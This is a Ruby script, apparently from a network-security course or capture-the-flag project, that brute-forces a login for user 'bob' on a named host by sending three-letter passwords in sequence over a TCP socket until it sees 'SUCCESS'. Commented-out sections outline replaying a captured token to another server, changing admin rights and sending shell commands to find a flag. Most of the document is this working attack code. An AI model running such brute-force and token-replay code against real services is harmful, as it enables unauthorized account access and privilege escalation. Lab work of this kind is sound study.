


require 'socket'
require 'openssl'
require 'json'

$state = 0
$serverIP = "140.113.194.85"
$serverPort = 49175
$admin = "admin"




def zCounterCalc(password)
  zCounter = 0
  # 計算後面有多少個z
  i = password.length-1
  for x in 1..password.length
    if password[i] == 'z'
      zCounter+=1
    else 
      break
    end	
    i-=1
  end
  return zCounter
end	


def testZCounter()

  puts zCounterCalc("aaa") == 0
  puts zCounterCalc("aaz") == 1
  puts zCounterCalc("azz") == 2
  puts zCounterCalc("zaz") == 1
  puts zCounterCalc("zzz") == 3

end
testZCounter()


def changeAtoZ(password,zCounter)

  # 把後面的z都改成a
  if zCounter >0 and zCounter <3
    j = password.length-1 
    for i in 1..zCounter
      password[j] = 'a'
      j-=1
    end
    if j >= 0 
      password[j] = (password[j].ord+1).chr
    end	
  end
  if zCounter == 0
    password[password.length-1] = (password[password.length-1].ord+1).chr
  end	
  if zCounter == 3 
    return false
  end	

  return password
end	


def testChangeAtoZ()
  puts changeAtoZ("aaa",0) == 'aab'
  puts changeAtoZ("aaz",1) == 'aba'
  puts changeAtoZ("azz",2) == 'baa'
  puts changeAtoZ("zaz",1) == 'zba'
  puts changeAtoZ("zzz",3) == false

end

testChangeAtoZ()

# 遞增密碼
def incressPassword(password)

  zCounter = zCounterCalc(password)

  password = changeAtoZ(password,zCounter)
  if password == false
    return true
  end
  return password
end

def getNewPassword()
  password = "aaa"

  s = TCPSocket.new 'nsproj.bitisle.net', 30011
  while line = s.recv(100) 
    if line.include? "username:"
      puts 'putbob'
      s.puts 'bob'
      puts 'bob'
    end	
    if line.include? "password:"
      tmp = incressPassword(password)
      if tmp == false 
	break
      end	
      password = tmp
      s.puts password         
      puts password
    end
    if line.include? "SUCCESS"
      break
    end	
    puts line
  end
  s.close
end

getNewPassword()

#s = TCPSocket.new 'nsproj.bitisle.net', 30011
## 轉送封包
#s.puts $token
#cmd = "first"
#
#while line = s.recv(2048) 
#	  puts line         
#	  if $state == 0
#		# 登入成功
#		if line.include? "Login Success"
#			$state = 1
#			next
#		end
#	  end
#	  # 輸入指令
#	  if $state == 1
#		  if line.include? cmd
#			  next
#		  end
#		  print "#"
#	          cmd = gets
#	          s.puts cmd
#	  end
#end
#
#s.close             
#




#server = TCPServer.new 2000 
#loop do
#	  client = server.accept    
#	  $token = client.gets
#	  # 確認封包沒有問題後，開始改權限
#	  if parseMessage() 
#		  if changeAdmin()
#			  break
#		  else
#		  end
#	  else 
#		  puts "token error"
#	  end
#
#end
#server.close
#
## 轉送封包，等待登入成功後開始送指令找flag2
#s = TCPSocket.new '140.113.194.85', 49175
## 轉送封包
#s.puts $token
#cmd = "first"
#
#while line = s.recv(2048) 
#	  puts line         
#	  if $state == 0
#		# 登入成功
#		if line.include? "Login Success"
#			$state = 1
#			next
#		end
#	  end
#	  # 輸入指令
#	  if $state == 1
#		  if line.include? cmd
#			  next
#		  end
#		  print "#"
#	          cmd = gets
#	          s.puts cmd
#	  end
#end
#
#s.close             
#
#
#
